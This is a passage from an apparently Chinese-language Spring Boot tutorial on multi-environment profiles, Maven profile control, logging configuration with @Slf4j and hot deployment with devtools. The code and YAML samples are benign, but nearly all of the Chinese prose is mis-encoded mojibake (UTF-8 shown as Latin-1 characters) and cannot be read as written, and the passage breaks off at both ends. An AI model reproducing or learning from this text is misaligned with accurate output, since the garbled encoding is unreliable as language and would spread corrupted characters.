80\n---\nspring:  # ç¯å¢ƒ2\n\tprofiles: dev  \nserver:\n\tport: 81\n```\n\né‚£ç”¨å“ªä¸€ä¸ªå‘¢ï¼Ÿè®¾ç½®é»˜è®¤å¯åŠ¨å“ªä¸ªå°±å¯ä»¥äº†\n\n```yaml\nspring:\n\tprofiles:\n\t\tactive: pro\t\t# å¯åŠ¨pro\n---\nspring:\n\tprofiles: pro\nserver:\n\tport: 80\n---\nspring:\n\tprofiles: dev\nserver:\n\tport: 81\n```\n\nå…¶ä¸­å…³äºç¯å¢ƒåç§°å®šä¹‰ä¸Šè¿°æ ¼å¼æ˜¯è¿‡æ—¶æ ¼å¼ï¼Œæ ‡å‡†æ ¼å¼å¦‚ä¸‹\n\n```yaml\nspring:\n\tconfig:\n    \tactivate:\n        \ton-profile: pro\n```\n\n**æ€»ç»“**\n\n1. å¤šç¯å¢ƒå¼€å‘éœ€è¦è®¾ç½®è‹¥å¹²ç§å¸¸ç”¨ç¯å¢ƒï¼Œä¾‹å¦‚å¼€å‘ã€ç”Ÿäº§ã€æµ‹è¯•ç¯å¢ƒ\n2. yamlæ ¼å¼ä¸­è®¾ç½®å¤šç¯å¢ƒä½¿ç”¨---åŒºåˆ†ç¯å¢ƒè®¾ç½®è¾¹ç•Œ\n3. æ¯ç§ç¯å¢ƒçš„åŒºåˆ«åœ¨äºåŠ è½½çš„é…ç½®å±æ€§ä¸åŒ\n4. å¯ç”¨æŸç§ç¯å¢ƒæ—¶éœ€è¦æŒ‡å®šå¯åŠ¨æ—¶ä½¿ç”¨è¯¥ç¯å¢ƒ\n\n### â‘¡yamlå¤šæ–‡ä»¶ç‰ˆ\n\nå°†æ‰€æœ‰çš„é…ç½®éƒ½æ”¾åœ¨ä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­ï¼Œå°¤å…¶æ˜¯æ¯ä¸€ä¸ªé…ç½®åº”ç”¨åœºæ™¯éƒ½ä¸ä¸€æ ·ï¼Œè¿™æ˜¾ç„¶ä¸åˆç†ï¼Œäºæ˜¯å°±æœ‰äº†å°†ä¸€ä¸ªé…ç½®æ–‡ä»¶æ‹†åˆ†æˆå¤šä¸ªé…ç½®æ–‡ä»¶çš„æƒ³æ³•ã€‚æ‹†åˆ†åï¼Œæ¯ä¸ªé…ç½®æ–‡ä»¶ä¸­å†™è‡ªå·±çš„é…ç½®ï¼Œä¸»é…ç½®æ–‡ä»¶ä¸­å†™æ¸…æ¥šç”¨å“ªä¸€ä¸ªé…ç½®æ–‡ä»¶å°±å¥½äº†ã€‚\n\n**ä¸»é…ç½®æ–‡ä»¶**\n\n```yaml\nspring:\n\tprofiles:\n\t\tactive: pro\t\t# å¯åŠ¨pro\n```\n\n**ç¯å¢ƒé…ç½®æ–‡ä»¶**\n\n```yaml\nserver:\n\tport: 80\n```\n\nç¯å¢ƒé…ç½®æ–‡ä»¶å› ä¸ºæ¯ä¸€ä¸ªéƒ½æ˜¯é…ç½®è‡ªå·±çš„é¡¹ï¼Œæ‰€ä»¥è¿åå­—éƒ½ä¸ç”¨å†™é‡Œé¢äº†ã€‚\n\né‚£å¦‚ä½•åŒºåˆ†è¿™æ˜¯å“ªä¸€ç»„é…ç½®å‘¢ï¼Ÿä½¿ç”¨æ–‡ä»¶ååŒºåˆ†ã€‚æ–‡ä»¶çš„å‘½åè§„åˆ™ä¸ºï¼šapplication-ç¯å¢ƒå.ymlã€‚\n\n**application-pro.yaml**\n\n```yaml\nserver:\n\tport: 80\n```\n\n**application-dev.yaml**\n\n```yaml\nserver:\n\tport: 81\n```\n\nåœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œå¦‚æœæŸäº›é…ç½®é¡¹æ‰€æœ‰ç¯å¢ƒéƒ½ä¸€æ ·ï¼Œå¯ä»¥å°†è¿™äº›é¡¹å†™å…¥åˆ°ä¸»é…ç½®ä¸­ï¼Œåªæœ‰å“ªäº›æœ‰åŒºåˆ«çš„é¡¹æ‰å†™å…¥åˆ°ç¯å¢ƒé…ç½®æ–‡ä»¶ä¸­ã€‚\n\n- ä¸»é…ç½®æ–‡ä»¶ä¸­è®¾ç½®å…¬å…±é…ç½®ï¼ˆå…¨å±€ï¼‰\n- ç¯å¢ƒé…ç½®æ–‡ä»¶ä¸­è®¾ç½®å†²çªå±æ€§ï¼ˆå±€éƒ¨ï¼‰\n\n**æ€»ç»“**\n\n1. å¯ä»¥ä½¿ç”¨ç‹¬ç«‹é…ç½®æ–‡ä»¶å®šä¹‰ç¯å¢ƒå±æ€§\n\n2. ç‹¬ç«‹é…ç½®æ–‡ä»¶ä¾¿äºçº¿ä¸Šç³»ç»Ÿç»´æŠ¤æ›´æ–°å¹¶ä¿éšœç³»ç»Ÿå®‰å…¨æ€§\n\n\n### â‘¢propertieså¤šæ–‡ä»¶ç‰ˆ\n\npropertiesæ–‡ä»¶å¤šç¯å¢ƒé…ç½®ä»…æ”¯æŒå¤šæ–‡ä»¶æ ¼å¼\n\n**ä¸»é…ç½®æ–‡ä»¶**\n\n```properties\nspring.profiles.active=pro\n```\n\n**ç¯å¢ƒé…ç½®æ–‡ä»¶**\n\n**application-pro.properties**\n\n```properties\nserver.port=80\n```\n\n**application-dev.properties**\n\n```properties\nserver.port=81\n```\n\næ–‡ä»¶çš„å‘½åè§„åˆ™ä¸ºï¼šapplication-ç¯å¢ƒå.propertiesã€‚\n\n### â‘£é…ç½®æ–‡ä»¶ä¹¦å†™æŠ€å·§\n\nä½œä¸ºç¨‹åºå‘˜åœ¨æé…ç½®çš„æ—¶å€™å¾€å¾€å¤„äºä¸€ç§åˆ†ä¹…å¿…åˆåˆä¹…å¿…åˆ†çš„å±€é¢ã€‚å¼€å§‹å…ˆå†™ä¸€èµ·ï¼Œåæ¥ä¸ºäº†æ–¹ä¾¿ç»´æŠ¤å°±æ‹†åˆ†ã€‚å¯¹äºå¤šç¯å¢ƒå¼€å‘ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œä¸‹é¢ç»™å¤§å®¶è¯´ä¸€ä¸‹å¦‚ä½•åŸºäºå¤šç¯å¢ƒå¼€å‘åšé…ç½®ç‹¬ç«‹ç®¡ç†ï¼ŒåŠ¡å¿…æŒæ¡ã€‚\n\n**a.å‡†å¤‡å·¥ä½œ**\n\nå°†æ‰€æœ‰çš„é…ç½®æ ¹æ®åŠŸèƒ½å¯¹é…ç½®æ–‡ä»¶ä¸­çš„ä¿¡æ¯è¿›è¡Œæ‹†åˆ†ï¼Œå¹¶åˆ¶ä½œæˆç‹¬ç«‹çš„é…ç½®æ–‡ä»¶ï¼Œå‘½åè§„åˆ™å¦‚ä¸‹\n\n- application-devDB.yml\n- application-devRedis.yml\n- application-devMVC.yml\n\n**b.ä½¿ç”¨**\n\nä½¿ç”¨includeå±æ€§åœ¨æ¿€æ´»æŒ‡å®šç¯å¢ƒçš„æƒ…å†µä¸‹ï¼ŒåŒæ—¶å¯¹å¤šä¸ªç¯å¢ƒè¿›è¡ŒåŠ è½½ä½¿å…¶ç”Ÿæ•ˆï¼Œå¤šä¸ªç¯å¢ƒé—´ä½¿ç”¨é€—å·åˆ†éš”\n\n```yaml\nspring:\n\tprofiles:\n    \tactive: dev\n        include: devDB,devRedis,devMVC\n```\n\nç°åœ¨ç›¸å½“äºåŠ è½½devé…ç½®æ—¶ï¼Œå†åŠ è½½å¯¹åº”çš„3ç»„é…ç½®ï¼Œä»ç»“æ„ä¸Šå°±å¾ˆæ¸…æ™°ï¼Œç”¨äº†ä»€ä¹ˆï¼Œå¯¹åº”çš„åç§°æ˜¯ä»€ä¹ˆ\n\n`æ³¨æ„`ï¼šå½“ä¸»ç¯å¢ƒdevä¸å…¶ä»–ç¯å¢ƒæœ‰ç›¸åŒå±æ€§æ—¶ï¼Œä¸»ç¯å¢ƒå±æ€§ç”Ÿæ•ˆï¼›å…¶ä»–ç¯å¢ƒä¸­æœ‰ç›¸åŒå±æ€§æ—¶ï¼Œæœ€ååŠ è½½çš„ç¯å¢ƒå±æ€§ç”Ÿæ•ˆ\n\n**c.æ”¹è‰¯**\n\nä½†æ˜¯ä¸Šé¢çš„è®¾ç½®ä¹Ÿæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæ¯”å¦‚æˆ‘è¦åˆ‡æ¢devç¯å¢ƒä¸ºproæ—¶ï¼Œincludeä¹Ÿè¦ä¿®æ”¹ã€‚å› ä¸ºincludeå±æ€§åªèƒ½ä½¿ç”¨ä¸€æ¬¡ï¼Œè¿™å°±æ¯”è¾ƒéº»çƒ¦äº†ã€‚SpringBootä»2.4ç‰ˆå¼€å§‹ä½¿ç”¨groupå±æ€§æ›¿ä»£includeå±æ€§ï¼Œé™ä½äº†é…ç½®ä¹¦å†™é‡ã€‚ç®€å•è¯´å°±æ˜¯æˆ‘å…ˆå†™å¥½ï¼Œä½ çˆ±ç”¨å“ªä¸ªç”¨å“ªä¸ªã€‚\n\n```yaml\nspring:\n\tprofiles:\n    \tactive: dev\n        group:\n        \t\"dev\": devDB,devRedis,devMVC\n      \t\t\"pro\": proDB,proRedis,proMVC\n      \t\t\"test\": testDB,testRedis,testMVC\n```\n\n### â‘¤å¤šç¯å¢ƒå¼€å‘æ§åˆ¶\n\nå¦‚æœmavenå’ŒSpringBootåŒæ—¶è®¾ç½®äº†å¤šç¯å¢ƒçš„è¯æ€ä¹ˆæã€‚è¦æƒ³å¤„ç†è¿™ä¸ªå†²çªé—®é¢˜ï¼Œä½ è¦å…ˆç†æ¸…ä¸€ä¸ªå…³ç³»ï¼Œç©¶ç«Ÿè°åœ¨å¤šç¯å¢ƒå¼€å‘ä¸­å…¶ä¸»å¯¼åœ°ä½ã€‚mavenæ˜¯åšä»€ä¹ˆçš„ï¼Ÿé¡¹ç›®æ„å»ºç®¡ç†çš„ï¼Œæœ€ç»ˆç”Ÿæˆä»£ç åŒ…çš„ï¼ŒSpringBootæ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿç®€åŒ–å¼€å‘çš„ã€‚ç®€åŒ–ï¼Œåˆä¸æ˜¯å…¶ä¸»å¯¼ä½œç”¨ã€‚æœ€ç»ˆè¿˜æ˜¯è¦é mavenæ¥ç®¡ç†æ•´ä¸ªå·¥ç¨‹ï¼Œæ‰€ä»¥SpringBootåº”è¯¥å¬mavençš„ã€‚å¤§ä½“æ€æƒ³å¦‚ä¸‹ï¼š\n\n- å…ˆåœ¨mavenç¯å¢ƒä¸­è®¾ç½®ç”¨ä»€ä¹ˆå…·ä½“çš„ç¯å¢ƒ\n- åœ¨SpringBootä¸­è¯»å–mavenè®¾ç½®çš„ç¯å¢ƒå³å¯\n\n**a.mavenä¸­è®¾ç½®å¤šç¯å¢ƒï¼ˆä½¿ç”¨å±æ€§æ–¹å¼åŒºåˆ†ç¯å¢ƒï¼‰**\n\n```xml\n<profiles>\n    <profile>     <!--ç¯å¢ƒ1-->\n        <id>env_dev</id>\n        <properties>\n            <profile.active>dev</profile.active>\n        </properties>\n        <activation>\n            <activeByDefault>true</activeByDefault>\t\t<!--é»˜è®¤å¯åŠ¨ç¯å¢ƒ-->\n        </activation>\n    </profile>\n  \n    <profile>     <!--ç¯å¢ƒ2-->\n        <id>env_pro</id>\n        <properties>\n            <profile.active>pro</profile.active>\n        </properties>\n    </profile>\n</profiles>\n```\n\n**b.SpringBootä¸­è¯»å–mavenè®¾ç½®å€¼**\n\n```yaml\nspring:\n\tprofiles:\n    \tactive: @profile.active@\n```\n\nä¸Šé¢çš„@å±æ€§å@å°±æ˜¯è¯»å–mavenä¸­é…ç½®çš„å±æ€§å€¼çš„è¯­æ³•æ ¼å¼ã€‚\n\n**æ€»ç»“**\n\n1. å½“Mavenä¸SpringBootåŒæ—¶å¯¹å¤šç¯å¢ƒè¿›è¡Œæ§åˆ¶æ—¶ï¼Œä»¥Mavnä¸ºä¸»ï¼ŒSpringBootä½¿ç”¨@..@å ä½ç¬¦è¯»å–Mavenå¯¹åº”çš„é…ç½®å±æ€§å€¼\n2. åŸºäºSpringBootè¯»å–Mavené…ç½®å±æ€§çš„å‰æä¸‹ï¼Œå¦‚æœåœ¨IDEAä¸‹æµ‹è¯•å·¥ç¨‹æ—¶pom.xmlæ¯æ¬¡æ›´æ–°éœ€è¦æ‰‹åŠ¨compileæ–¹å¯ç”Ÿæ•ˆ\n\n## 4.æ—¥å¿—\n\næ—¥å¿—å°±æ˜¯è®°å½•ç¨‹åºæ—¥å¸¸è¿è¡Œçš„ä¿¡æ¯ï¼Œä¸»è¦ä½œç”¨å¦‚ä¸‹ï¼š\n\n- ç¼–ç¨‹æœŸè°ƒè¯•ä»£ç \n- è¿è¥æœŸè®°å½•ä¿¡æ¯\n  - è®°å½•æ—¥å¸¸è¿è¥é‡è¦ä¿¡æ¯ï¼ˆå³°å€¼æµé‡ã€å¹³å‡å“åº”æ—¶é•¿â€¦â€¦ï¼‰\n  - è®°å½•åº”ç”¨æŠ¥é”™ä¿¡æ¯ï¼ˆé”™è¯¯å †æ ˆï¼‰\n  - è®°å½•è¿ç»´è¿‡ç¨‹æ•°æ®ï¼ˆæ‰©å®¹ã€å®•æœºã€æŠ¥è­¦â€¦â€¦ï¼‰\n\n\n### â‘ å¼€å¯æ—¥å¿—\n\n**æ­¥éª¤â‘ **ï¼šæ·»åŠ æ—¥å¿—è®°å½•æ“ä½œ\n\n```java\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController extends BaseClass{\n    private static final Logger log = LoggerFactory.getLogger(BookController.class);\n    @GetMapping\n    public String getById(){\n        log.debug(\"debug...\");\n        log.info(\"info...\");\n        log.warn(\"warn...\");\n        log.error(\"error...\");\n        return \"springboot is running...\";\n    }\n}\n```\n\nä¸Šè¿°ä»£ç ä¸­logå¯¹è±¡å°±æ˜¯ç”¨æ¥è®°å½•æ—¥å¿—çš„å¯¹è±¡ï¼Œä¸‹é¢çš„log.debugï¼Œlog.infoè¿™äº›æ“ä½œå°±æ˜¯å†™æ—¥å¿—çš„APIäº†ã€‚\n\n**æ­¥éª¤â‘¡**ï¼šè®¾ç½®æ—¥å¿—è¾“å‡ºçº§åˆ«\n\næ—¥å¿—è®¾ç½®å¥½ä»¥åå¯ä»¥æ ¹æ®è®¾ç½®é€‰æ‹©å“ªäº›å‚ä¸è®°å½•ã€‚è¿™é‡Œæ˜¯æ ¹æ®æ—¥å¿—çš„çº§åˆ«æ¥è®¾ç½®çš„ã€‚æ—¥å¿—çš„çº§åˆ«åˆ†ä¸º6ç§ï¼Œåˆ†åˆ«æ˜¯ï¼š\n\n- TRACEï¼šè¿è¡Œå †æ ˆä¿¡æ¯ï¼Œä½¿ç”¨ç‡ä½\n- **DEBUG**ï¼šç¨‹åºå‘˜è°ƒè¯•ä»£ç ä½¿ç”¨\n- **INFO**ï¼šè®°å½•è¿ç»´è¿‡ç¨‹æ•°æ®\n- **WARN**ï¼šè®°å½•è¿ç»´è¿‡ç¨‹æŠ¥è­¦æ•°æ®\n- **ERROR**ï¼šè®°å½•é”™è¯¯å †æ ˆä¿¡æ¯\n- FATALï¼šç¾éš¾ä¿¡æ¯ï¼Œåˆå¹¶è®¡å…¥ERROR\n\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¼€å‘æ—¶å€™ä½¿ç”¨DEBUGï¼Œä¸Šçº¿åä½¿ç”¨INFOï¼Œè¿ç»´ä¿¡æ¯è®°å½•ä½¿ç”¨WARNå³å¯ã€‚\n\nä¸‹é¢å°±è®¾ç½®ä¸€ä¸‹æ—¥å¿—çº§åˆ«ï¼š\n\n```yaml\n# å¼€å¯debugæ¨¡å¼ï¼Œè¾“å‡ºè°ƒè¯•ä¿¡æ¯ï¼Œå¸¸ç”¨äºæ£€æŸ¥ç³»ç»Ÿè¿è¡ŒçŠ¶å†µ\ndebug: true\n```\n\nè¿™ä¹ˆè®¾ç½®å¤ªç®€å•ç²—æš´äº†ï¼Œæ—¥å¿—ç³»ç»Ÿé€šå¸¸éƒ½æä¾›äº†ç»†ç²’åº¦çš„æ§åˆ¶\n\n```yaml\n# å¼€å¯debugæ¨¡å¼ï¼Œè¾“å‡ºè°ƒè¯•ä¿¡æ¯ï¼Œå¸¸ç”¨äºæ£€æŸ¥ç³»ç»Ÿè¿è¡ŒçŠ¶å†µ\ndebug: true\n\n# è®¾ç½®æ—¥å¿—çº§åˆ«ï¼Œrootè¡¨ç¤ºæ ¹èŠ‚ç‚¹ï¼Œå³æ•´ä½“åº”ç”¨æ—¥å¿—çº§åˆ«\nlogging:\n\tlevel:\n    \troot: debug\n```\n\nè¿˜å¯ä»¥å†è®¾ç½®æ›´ç»†ç²’åº¦çš„æ§åˆ¶ï¼Œå¯ä»¥ç›´æ¥æ§åˆ¶æŒ‡å®šåŒ…å¯¹åº”çš„æ—¥å¿—è¾“å‡ºçº§åˆ«\n\n```yaml\nlogging:\n    level:\n    \troot: warn\n    \t# è®¾ç½®æŸåŒ…åŒ…è®¾ç½®æ—¥å¿—çº§åˆ«\n      com.jianjian.config: debug\n```\n\n**æ­¥éª¤â‘¢**ï¼šè®¾ç½®æ—¥å¿—ç»„ï¼Œæ§åˆ¶æŒ‡å®šåŒ…å¯¹åº”çš„æ—¥å¿—è¾“å‡ºçº§åˆ«\n\n```yaml\nlogging:\n\t# è®¾ç½®æ—¥å¿—ç»„\n    group:\n    \t# è‡ªå®šä¹‰ç»„åï¼Œè®¾ç½®å½“å‰ç»„ä¸­æ‰€åŒ…å«çš„åŒ…\n        book: com.jianjian.controller\n        test: com.jianjian.dao,com.jianjian.service\n    level:\n    \troot: warn\n      # ä¸ºå¯¹åº”ç»„è®¾ç½®æ—¥å¿—çº§åˆ«\n      book: debug\n      test: info\n```\n\n**æ€»ç»“**\n\n1. æ—¥å¿—ç”¨äºè®°å½•å¼€å‘è°ƒè¯•ä¸è¿ç»´è¿‡ç¨‹æ¶ˆæ¯\n2. æ—¥å¿—çš„çº§åˆ«å…±6ç§ï¼Œé€šå¸¸ä½¿ç”¨4ç§å³å¯ï¼Œåˆ†åˆ«æ˜¯DEBUGï¼ŒINFOï¼ŒWARNï¼ŒERROR\n3. å¯ä»¥é€šè¿‡æ—¥å¿—ç»„æˆ–ä»£ç åŒ…çš„å½¢å¼è¿›è¡Œæ—¥å¿—æ˜¾ç¤ºçº§åˆ«çš„æ§åˆ¶\n\n### â‘¡@Slf4j\n\næ¯ä¸ªç±»éƒ½è¦å†™åˆ›å»ºæ—¥å¿—è®°å½•å¯¹è±¡ï¼Œå¤ªç¹çï¼Œå¯ä»¥ä½¿ç”¨lombokç»™æˆ‘ä»¬æä¾›çš„å·¥å…·ç±»ã€‚\n\n```java\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController extends BaseClass{\n    private static final Logger log = LoggerFactory.getLogger(BookController.class);\t//è¿™ä¸€å¥å¯ä»¥ä¸å†™äº†\n}\n```\n\nå¯¼å…¥lombokåä½¿ç”¨@Slf4jæ³¨è§£æå®šï¼Œæ—¥å¿—å¯¹è±¡åä¸ºlog\n\n```java\n@Slf4j\t\t//è¿™ä¸ªæ³¨è§£æ›¿ä»£äº†ä¸Šé¢é‚£ä¸€è¡Œ\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController extends BaseClass{\n    @GetMapping\n    public String getById(){\n        log.debug(\"debug...\");\n        log.info(\"info...\");\n        log.warn(\"warn...\");\n        log.error(\"error...\");\n        return \"springboot is running...\";\n    }\n}\n```\n\n### â‘¢æ—¥å¿—è¾“å‡ºæ ¼å¼\n\nç›®å‰è®°å½•çš„æ ¼å¼æ˜¯SpringBootç»™æˆ‘ä»¬æä¾›çš„ï¼Œå¦‚æœæƒ³è‡ªå®šä¹‰æ§åˆ¶å°±éœ€è¦è‡ªå·±è®¾ç½®äº†ã€‚å…ˆåˆ†æä¸€ä¸‹å½“å‰æ—¥å¿—çš„è®°å½•æ ¼å¼ã€‚\n\n![](https://img.jwt1399.top/img/202209121704365.png)\n\n- çº§åˆ«ç”¨äºåšç­›é€‰è¿‡æ»¤ï¼ŒPIDä¸çº¿ç¨‹åç”¨äºåšç²¾å‡†åˆ†æã€‚\n\n- æ‰€å±ç±»/æ¥å£åï¼šå½“åç§°è¿‡é•¿æ—¶ï¼Œç®€åŒ–åŒ…åä¹¦å†™ä¸ºé¦–å­—æ¯ï¼Œç”šè‡³ç›´æ¥åˆ é™¤\n\nä¸‹é¢æ˜¯æ¨¡æ‹Ÿä¸Šæ–¹å›¾ç‰‡ä¸­æ—¥å¿—æ ¼å¼çš„é…ç½®æ–¹å¼\n\n```yaml\nlogging:\n\tpattern:\n    \tconsole: \"%d %clr(%p) --- [%16t] %clr(%-40.40c){cyan} : %m %n\"\n```\n\n- %dï¼š æ—¶é—´\n- %clrï¼šå¸¦é¢œè‰²æ˜¾ç¤º\n- %pï¼š   PID\n- %16tï¼š%tä»£è¡¨çº¿ç¨‹ ï¼Œ16ä»£ç æ˜¾ç¤ºé•¿åº¦ä¸º16  \n- %-40.40cï¼š  %cä»£è¡¨æ‰€å±ç±»ï¼Œ-40ä»£è¡¨å·¦å¯¹é½æ˜¾ç¤ºé•¿åº¦40ï¼Œ.40é•¿åº¦è¶…è¿‡40å¼€å§‹æˆªæ–­\n- {cyan}ï¼šè‡ªå®šä¹‰æ˜¾ç¤ºé¢œè‰²\n- %mï¼šæ¶ˆæ¯\n- %nï¼šæ¢è¡Œ\n\nè¯¦ç»†å¯å‚è€ƒï¼š[log4j æ—¥å¿—æ ¼å¼è¯¦è§£](https://blog.csdn.net/zhangyunfei1984/article/details/115419360)\n\n### â‘£æ—¥å¿—æ–‡ä»¶\n\nå¦‚ä½•æŠŠæ—¥å¿—è®°å½•åˆ°æ–‡ä»¶ä¸­ï¼Œæ–¹ä¾¿åæœŸç»´æŠ¤æŸ¥é˜…ã€‚è®¾ç½®æ—¥å¿—æ–‡ä»¶åå³å¯ã€‚\n\n```yaml\nlogging:\n\tfile:\n    \tname: server.log\n```\n\nä¸ºäº†ä¾¿äºç»´æŠ¤ï¼Œå¯ä»¥é™åˆ¶æ¯ä¸ªæ—¥å¿—æ–‡ä»¶çš„å¤§å°ï¼Œäº§ç”Ÿå¤šä¸ªæ—¥å¿—æ–‡ä»¶ã€‚\n\n```yaml\nlogging:\n\tlogback:\n    \trollingpolicy:\n        \tmax-file-size: 3KB  # é™åˆ¶æ¯ä¸ªæ—¥å¿—æ–‡ä»¶å¤§å°\n            file-name-pattern: server.%d{yyyy-MM-dd}.%i.log #æ—¥å¿—æ–‡ä»¶å‘½åè§„åˆ™\n```\n\nä»¥ä¸Šæ ¼å¼æ˜¯åŸºäºlogbackæ—¥å¿—æŠ€æœ¯è®¾ç½®æ¯æ—¥æ—¥å¿—æ–‡ä»¶çš„è®¾ç½®æ ¼å¼ï¼Œè¦æ±‚å®¹é‡åˆ°è¾¾3KBä»¥åå°±è½¬å­˜ä¿¡æ¯åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶ä¸­ã€‚æ–‡ä»¶å‘½åè§„åˆ™ä¸­çš„%dæ ‡è¯†æ—¥æœŸï¼Œ%iæ˜¯ä¸€ä¸ªé€’å¢å˜é‡ï¼Œç”¨äºåŒºåˆ†æ—¥å¿—æ–‡ä»¶ã€‚\n\n# å¼€å‘å®ç”¨ç¯‡\n\n## 1.çƒ­éƒ¨ç½²\n\n### â‘ ä»€ä¹ˆæ˜¯çƒ­éƒ¨ç½²ï¼Ÿ\n\nç®€å•è¯´å°±æ˜¯ä½ ç¨‹åºæ”¹äº†ï¼Œç°åœ¨è¦é‡æ–°å¯åŠ¨æœåŠ¡å™¨ï¼Œå«Œéº»çƒ¦ï¼Ÿä¸ç”¨é‡å¯ï¼ŒæœåŠ¡å™¨ä¼šè‡ªå·±æ‚„æ‚„çš„æŠŠæ›´æ–°åçš„ç¨‹åºç»™é‡æ–°åŠ è½½ä¸€éï¼Œè¿™å°±æ˜¯çƒ­éƒ¨ç½²ã€‚\n\nçƒ­éƒ¨ç½²çš„åŠŸèƒ½æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿè¿™å°±è¦åˆ†ä¸¤ç§æƒ…å†µæ¥è¯´äº†ï¼Œéspringbootå·¥ç¨‹å’Œspringbootå·¥ç¨‹çš„çƒ­éƒ¨ç½²å®ç°æ–¹å¼å®Œå…¨ä¸ä¸€æ ·ã€‚å…ˆè¯´ä¸€ä¸‹åŸå§‹çš„éspringbooté¡¹ç›®æ˜¯å¦‚ä½•å®ç°çƒ­éƒ¨ç½²çš„ã€‚\n\n**éspringbooté¡¹ç›®çƒ­éƒ¨ç½²å®ç°åŸç†**\n\nå¼€å‘éspringbooté¡¹ç›®æ—¶ï¼Œæˆ‘ä»¬è¦åˆ¶ä½œä¸€ä¸ªwebå·¥ç¨‹å¹¶é€šè¿‡tomcatå¯åŠ¨ï¼Œé€šå¸¸éœ€è¦å…ˆå®‰è£…tomcatæœåŠ¡å™¨åˆ°ç£ç›˜ä¸­ï¼Œå¼€å‘çš„ç¨‹åºé…ç½®å‘å¸ƒåˆ°å®‰è£…çš„tomcatæœåŠ¡å™¨ä¸Šã€‚å¦‚æœæƒ³å®ç°çƒ­éƒ¨ç½²çš„æ•ˆæœæœ‰ä¸¤ç§åšæ³•ï¼Œä¸€ç§æ˜¯åœ¨tomcatæœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®ã€‚å¦ä¸€ç§åšæ³•æ˜¯é€šè¿‡IDEå·¥å…·è¿›è¡Œé…ç½®ã€‚æ ¸å¿ƒæ€æƒ³æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯ä½¿ç”¨æœåŠ¡å™¨å»ç›‘æ§å…¶ä¸­åŠ è½½çš„åº”ç”¨ï¼Œå‘ç°äº§ç”Ÿäº†å˜åŒ–å°±é‡æ–°åŠ è½½ä¸€æ¬¡ã€‚\n\n**springbooté¡¹ç›®çƒ­éƒ¨ç½²å®ç°åŸç†**\n\nâ€‹\t\tåŸºäºspringbootå¼€å‘çš„webå·¥ç¨‹å…¶å®æœ‰ä¸€ä¸ªæ˜¾è‘—çš„ç‰¹å¾ï¼Œå°±æ˜¯tomcatæœåŠ¡å™¨å†…ç½®äº†ã€‚æœåŠ¡å™¨æ˜¯ä»¥ä¸€ä¸ªå¯¹è±¡çš„å½¢å¼åœ¨springå®¹å™¨ä¸­è¿è¡Œçš„ã€‚æœ¬æ¥æˆ‘ä»¬æœŸæœ›äºtomcatæœåŠ¡å™¨åŠ è½½ç¨‹åºåç”±tomcatæœåŠ¡å™¨ç›¯ç€ç¨‹åºï¼Œä½ å˜åŒ–åæˆ‘å°±é‡æ–°å¯åŠ¨é‡æ–°åŠ è½½ï¼Œä½†æ˜¯ç°åœ¨tomcatå’Œæˆ‘ä»¬çš„ç¨‹åºæ˜¯å¹³çº§çš„äº†ï¼Œéƒ½æ˜¯springå®¹å™¨ä¸­çš„ç»„ä»¶ï¼Œè¿™ä¸‹å°±éº»çƒ¦äº†ï¼Œç¼ºä¹äº†ä¸€ä¸ªç›´æ¥çš„ç®¡ç†æƒï¼Œé‚£è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿç®€å•ï¼Œå†æä¸€ä¸ªç¨‹åºXåœ¨springå®¹å™¨ä¸­ç›¯ç€ä½ åŸå§‹å¼€å‘çš„ç¨‹åºAä¸å°±è¡Œäº†å—ï¼Ÿç¡®å®ï¼Œæä¸€ä¸ªç›¯ç€ç¨‹åºAçš„ç¨‹åºXå°±è¡Œäº†ï¼Œå¦‚æœä½ è‡ªå·±å¼€å‘çš„ç¨‹åºAå˜åŒ–äº†ï¼Œé‚£ä¹ˆç¨‹åºXå°±å‘½ä»¤tomcatå®¹å™¨é‡æ–°åŠ è½½ç¨‹åºAå°±OKäº†ã€‚å¹¶ä¸”è¿™æ ·åšæœ‰ä¸€ä¸ªå¥½å¤„ï¼Œspringå®¹å™¨ä¸­ä¸œè¥¿ä¸ç”¨å…¨éƒ¨é‡æ–°åŠ è½½ä¸€éï¼Œåªéœ€è¦é‡æ–°åŠ è½½ä½ å¼€å‘çš„ç¨‹åºé‚£ä¸€éƒ¨åˆ†å°±å¯ä»¥äº†ï¼Œè¿™ä¸‹æ•ˆç‡åˆé«˜äº†ï¼ŒæŒºå¥½ã€‚\n\nâ€‹\tä¸‹é¢å°±è¯´è¯´ï¼Œæ€ä¹ˆæå‡ºæ¥è¿™ä¹ˆä¸€ä¸ªç¨‹åºXï¼Œè‚¯å®šä¸æ˜¯æˆ‘ä»¬è‡ªå·±æ‰‹å†™äº†ï¼Œspringbootæ—©å°±åšå¥½äº†ï¼Œæä¸€ä¸ªåæ ‡å¯¼å…¥è¿›å»å°±è¡Œäº†ã€‚\n\n### â‘¡æ‰‹åŠ¨å¯åŠ¨çƒ­éƒ¨ç½²\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥å¼€å‘è€…å·¥å…·å¯¹åº”çš„åæ ‡\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-devtools</artifactId>\n    <optional>true</optional>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šæ„å»ºé¡¹ç›®ï¼Œå¯ä»¥ä½¿ç”¨å¿«æ·é”®ï¼ˆctrl+F9æˆ–è€…command+F9ï¼‰æ¿€æ´»æ­¤åŠŸèƒ½\n\n![](https://img.jwt1399.top/img/202209122115363.png)\n\n**åº•å±‚çš„å·¥ä½œå·¥ç¨‹åŸç†ï¼šé‡å¯ä¸é‡è½½**\n\nâ€‹\t\tä¸€ä¸ªspringbooté¡¹ç›®åœ¨è¿è¡Œæ—¶å®é™…ä¸Šæ˜¯åˆ†ä¸¤ä¸ªè¿‡ç¨‹è¿›è¡Œçš„ï¼Œæ 